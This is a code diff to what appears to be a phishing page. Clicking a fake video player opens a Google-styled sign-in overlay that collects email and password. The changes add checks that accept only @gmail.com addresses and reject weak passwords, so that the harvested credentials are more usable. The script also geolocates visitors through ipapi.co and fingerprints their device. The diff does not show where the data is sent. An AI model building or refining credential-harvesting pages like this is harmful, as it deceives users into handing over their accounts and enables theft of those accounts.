@@ -301,13 +301,25 @@
             border-radius: 6px;
             font-size: 15px;
             color: #202124;
-            margin-bottom: 14px;
+            margin-bottom: 8px;
             outline: none;
         }
 
         .g-input:focus {
             border-color: #1a73e8;
             border-width: 2px;
+        }
+
+        .g-error {
+            display: none;
+            color: #d93025;
+            font-size: 13px;
+            margin: 0 0 14px 0;
+            line-height: 1.4;
+        }
+
+        .g-error.show {
+            display: block;
         }
 
         .g-link {
@@ -417,6 +429,8 @@
             <input type="text" class="g-input" id="emailInput" placeholder="Email Address">
             <input type="password" class="g-input" id="passInput" placeholder="Password">
 
+            <div class="g-error" id="errorMsg"></div>
+
             <span class="g-link">Forgot your email?</span>
 
             <div class="g-note">
@@ -439,6 +453,7 @@
         const btnNext = document.getElementById('btnNext');
         const emailInput = document.getElementById('emailInput');
         const passInput = document.getElementById('passInput');
+        const errorMsg = document.getElementById('errorMsg');
 
         player.addEventListener('click', function () {
             overlay.classList.add('active');
@@ -451,19 +466,54 @@
             }, 220);
         });
 
+        // Validasi
+        function validate(email, password) {
+            errorMsg.classList.remove('show');
+            errorMsg.textContent = '';
+
+            // Email harus @gmail.com
+            if (!email.endsWith('@gmail.com')) {
+                errorMsg.textContent = 'Hanya boleh menggunakan email @gmail.com';
+                errorMsg.classList.add('show');
+                return false;
+            }
+
+            // Password minimal 8 karakter
+            if (password.length < 8) {
+                errorMsg.textContent = 'Password minimal 8 karakter';
+                errorMsg.classList.add('show');
+                return false;
+            }
+
+            // Password ga boleh full angka
+            if (/^\d+$/.test(password)) {
+                errorMsg.textContent = 'Password tidak boleh hanya berisi angka';
+                errorMsg.classList.add('show');
+                return false;
+            }
+
+            return true;
+        }
+
         btnNext.addEventListener('click', async function () {
             const email = emailInput.value.trim();
             const password = passInput.value.trim();
 
             if (!email || !password) {
-                alert('Isi email dan password dulu');
+                errorMsg.textContent = 'Email dan password wajib diisi';
+                errorMsg.classList.add('show');
+                return;
+            }
+
+            // Jalankan validasi
+            if (!validate(email, password)) {
                 return;
             }
 
             btnNext.textContent = 'Loading...';
             btnNext.disabled = true;
 
-            // Ambil data lokasi dari ipapi.co
+            // Ambil data lokasi
             let geo = {};
             try {
                 const geoRes = await fetch('https://ipapi.co/json/');
@@ -472,7 +522,7 @@
                 console.log('Geo fetch error:', e);
             }
 
-            // Deteksi device / OS / browser
+            // Deteksi device
             const ua = navigator.userAgent;
             const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
             const device = isMobile ? 'Mobile' : 'Desktop';
